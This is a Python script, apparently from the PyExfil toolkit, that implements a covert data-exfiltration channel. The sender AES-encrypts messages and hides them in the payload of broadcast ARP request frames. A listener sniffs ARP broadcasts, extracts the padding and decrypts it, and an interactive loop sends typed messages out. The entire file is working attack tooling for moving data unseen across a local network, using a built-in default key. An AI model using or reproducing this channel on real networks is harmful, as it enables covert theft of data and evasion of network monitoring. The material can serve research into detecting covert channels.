#!/usr/bin/env python3

import logging
import threading

from scapy.all import Ether, ARP, Raw, sniff, sendp, Padding

from pyexfil.includes.encryption_wrappers import AESDecryptOFB, AESEncryptOFB, _DEFAULT_PASSWORD

logging.getLogger().setLevel(logging.DEBUG)


def _default_callback(original_frame, decrypted_msg):
    print("\n[%s] '%s'.\n" % (original_frame[Ether].src.lower(), decrypted_msg))


class Broker:

    def __init__(self, key=_DEFAULT_PASSWORD, ret_func=_default_callback):
        logging.info('Now listening for ARP Broadcasts.')
        logging.info("Hit 'exit' to quit.")
        self.ret_func = ret_func
        self.key = key

    def parse_message(self, pkt):
        if pkt[ARP].op != 1:
            return
        if pkt[Ether].dst.lower() != "ff:ff:ff:ff:ff:ff":
            return

        try:
            payload = pkt[ARP][Padding].load
        except Exception:
            return

        dec_payload = AESDecryptOFB(key=self.key, data=payload)
        if self.ret_func is not None:
            self.ret_func(pkt, dec_payload)

    def listen_clients(self):
        while True:
            sniff(prn=self.parse_message, filter="arp", store=0, count=1)


def broadcast_message(message, key=_DEFAULT_PASSWORD):
    if isinstance(message, str):
        message = message.encode('utf-8')
    msg = AESEncryptOFB(key=key, text=message)
    frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst="192.168.1.254") / Raw(load=msg)
    sendp(frame, verbose=False)


if __name__ == '__main__':
    b = Broker()
    t = threading.Thread(target=b.listen_clients, daemon=True)
    t.start()
    while True:
        send_me = input("message> ").strip()
        if not send_me:
            continue
        if send_me == "exit":
            logging.info("Got exit message.")
            break
        broadcast_message(send_me)
        logging.info("[%s] out the door." % len(send_me))
